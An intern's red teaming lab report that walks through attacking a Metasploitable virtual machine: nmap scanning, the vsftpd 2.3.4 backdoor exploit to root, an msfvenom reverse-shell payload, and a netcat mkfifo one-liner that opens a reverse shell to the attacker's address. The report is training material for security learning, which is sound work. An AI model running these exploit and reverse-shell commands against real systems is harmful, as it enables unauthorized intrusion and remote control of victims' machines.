# Week 4 - Red Teaming Practical Report

## 👤 Intern Details

Name: Pretam Saha
Program: CYART Red Teaming Internship

---

# 🔴 Introduction

Red Teaming is the practice of simulating real-world cyber attacks to evaluate the security of systems. In this Week 4 practical, multiple offensive security techniques were performed using Kali Linux and Metasploitable to understand the complete attack lifecycle.

---

# 🧠 Tools Used

* Kali Linux
* Metasploit Framework
* Nmap
* Netcat
* AWS CLI

---

# 🟢 1. Advanced Command & Control (C2)

## Objective

To establish a communication channel between attacker and victim.

## Commands

```id="wz19mk"
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.30.130
set LPORT 4444
run
```

## Explanation

A reverse TCP handler was configured in Metasploit. This enables the attacker to listen for incoming connections from compromised systems and maintain persistent control.

## Result

Handler started successfully.

---

# 🔵 2. Reconnaissance using Nmap

## Command

```id="l0k0b3"
nmap 192.168.30.129
```

## Output

Open ports identified:
49 (NFS), 2121 (FTP), 3306 (MySQL), 5432 (PostgreSQL),
5900 (VNC), 6000 (X11), 6667 (IRC), 8009 (AJP13), 8180

## Explanation

Nmap was used to scan the target system and identify open ports and services. This step helps in discovering potential vulnerabilities.

---

# 🟣 3. Exploitation (Adversary Emulation)

## Commands

```id="9cgm6r"
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.30.129
set LHOST 192.168.30.130
run
```

## Explanation

The VSFTPD 2.3.4 backdoor vulnerability was exploited to gain unauthorized access to the target system.

## Result

Meterpreter session opened and root access obtained.

---

# 🟡 4. Post Exploitation

## Commands

```id="tgj4gu"
getuid
pwd
sysinfo
```

## Explanation

After gaining access, system-level commands were executed to gather information and verify privileges.

## Result

Root-level access confirmed.

---

# 🟠 5. Payload Creation (Evasion Technique)

## Command

```id="h6n4qb"
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.30.130 LPORT=4444 -f elf > shell.elf
```

## Explanation

A reverse shell payload was generated using msfvenom. This payload can be used to establish remote access while attempting to evade detection.

## Result

Payload successfully created.

---

# 🔴 6. Reverse Shell (Living-Off-the-Land)

## Commands

### Attacker (Kali)

```id="krb2im"
nc -lvnp 4444
```

### Victim (Metasploitable)

```id="0o81lq"
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.30.130 4444 > /tmp/f
```

## Explanation

A reverse shell was established using Netcat, allowing the attacker to remotely execute commands on the victim machine.

## Result

Connection successfully established and commands executed.

---

# 🟢 7. Cloud Attack Simulation

## Command

```id="2uvr2p"
aws --version
```

## Explanation

AWS CLI was used to simulate interaction with cloud environments, demonstrating awareness of cloud-based attack surfaces.

---

# 🔵 8. Automated Attack Simulation

## Explanation

A multi-stage attack process was simulated, including reconnaissance, exploitation, and access. This demonstrates how attackers automate attack workflows in real scenarios.

---

# 🟣 9. Capstone Project (Full Adversary Simulation)

## Phases Covered

* Reconnaissance
* Exploitation
* Post-Exploitation
* Payload Generation
* Reverse Shell

## Explanation

A complete attack lifecycle was successfully demonstrated. The practical showed how attackers identify vulnerabilities, exploit systems, and maintain access, reflecting real-world red team operations.

---

# 📸 Screenshots

All screenshots related to:

* Metasploit handler
* Nmap scan
* Exploitation
* Meterpreter session
* Payload creation
* Reverse shell

are included in this folder.

---

# ✅ Conclusion

This practical provided hands-on experience in red teaming techniques, including scanning, exploitation, payload creation, and remote access. It enhanced understanding of real-world cyber attack methodologies and security testing.

---

# ⭐ Learning Outcome

* Gained practical experience in penetration testing
* Understood real-world attack lifecycle
* Learned exploitation and post-exploitation techniques
* Developed hands-on cybersecurity skills

---
